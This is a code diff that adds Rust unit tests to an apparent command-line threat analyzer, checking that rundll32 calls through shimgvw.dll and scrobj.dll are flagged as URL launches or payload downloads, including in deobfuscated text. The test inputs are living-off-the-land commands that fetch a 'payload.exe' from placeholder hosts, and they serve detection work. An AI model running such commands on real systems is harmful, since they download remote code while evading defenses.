@@ -7328,6 +7328,48 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn rundll32_image_viewer_url_argument_emits_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"rundll32.exe shimgvw.dll,ImageView_Fullscreen "https://rundll32-image.example/pic.jpg""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "https://rundll32-image.example/pic.jpg"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 image viewer URL launch not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_scrobj_generatetypelib_url_argument_emits_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj.example/payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "https://rundll32-scrobj.example/payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 scrobj GenerateTypeLib URL download not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn rundll32_quoted_downloaded_dll_with_spaces_resolves_url() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -12222,6 +12264,50 @@ rundll32 url.dll,FileProtocolHandler https://rundll32-launch.example/extensionle
                     )
                 }),
                 "rundll32 FileProtocolHandler URL double-emitted with weaker type: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn rundll32_url_exports_in_deob_text_emit_typed_traits() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"rundll32.exe shimgvw.dll,ImageView_Fullscreen "https://rundll32-image-deob.example/pic.jpg"
+rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/payload.exe"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlLaunch { url, .. }
+                        if url == "https://rundll32-image-deob.example/pic.jpg"
+                )
+            }),
+            "missing rundll32 image UrlLaunch in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. }
+                        if src == "https://rundll32-scrobj-deob.example/payload.exe"
+                )
+            }),
+            "missing rundll32 scrobj Download in deob text: {:?}",
+            env.traits
+        );
+        for generic in [
+            "https://rundll32-image-deob.example/pic.jpg",
+            "https://rundll32-scrobj-deob.example/payload.exe",
+        ] {
+            assert!(
+                !env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == generic)),
+                "rundll32 typed URL double-emitted as generic: {:?}",
                 env.traits
             );
         }
